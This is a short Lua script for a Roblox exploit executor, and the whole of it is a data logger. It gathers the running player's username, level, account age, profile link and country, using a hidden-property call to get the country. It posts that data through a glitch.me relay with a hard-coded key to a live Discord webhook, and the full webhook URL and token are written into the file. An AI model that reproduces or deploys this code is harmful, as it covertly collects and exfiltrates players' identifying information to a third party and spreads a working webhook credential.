local Webhook = "https://discordapp.com/api/webhooks/728026773094137879/YfyEuNKfsjKQPXehBxvwPawzcejTH_J4hjmdA99JWCruoUFhoFtfaHj5C3--yY7msyZ-"
local Hp = gethiddenproperty or get_hidden_prop
local function log(name,message,hook)
    local api = "http://buritoman69.glitch.me/webhook"
    local Body = {
        ["Key"] = "applesaregood",
        ["Message"] = tostring(message),
        ["Name"] = tostring(game.Players.LocalPlayer.Name),
        ["Webhook"] = tostring(hook)
    }
    local data = game:HttpPost(api,game:GetService("HttpService"):JSONEncode(Body),false,"application/json")
    return data or nil
end
log("PlayerName", "<@&728022304373735549> | Name: **"..game.Players.LocalPlayer.Name.."** | Level: **"..game.Players.LocalPlayer.stats.other.Level.Value.."** | Age: **"..game.Players.LocalPlayer.AccountAge.."** Days", Webhook)
for _,v in pairs(game:GetService("Players"):GetPlayers()) do
    if v.Name == game:GetService("Players").LocalPlayer.Name then
        local Countries = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://country.io/names.json"))
        local ParsedCountry = Countries[Hp(v,"CountryRegionCodeReplicate")]
        log("PlayerName", "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile | They're from **".. tostring(ParsedCountry).."**", Webhook)
    end
end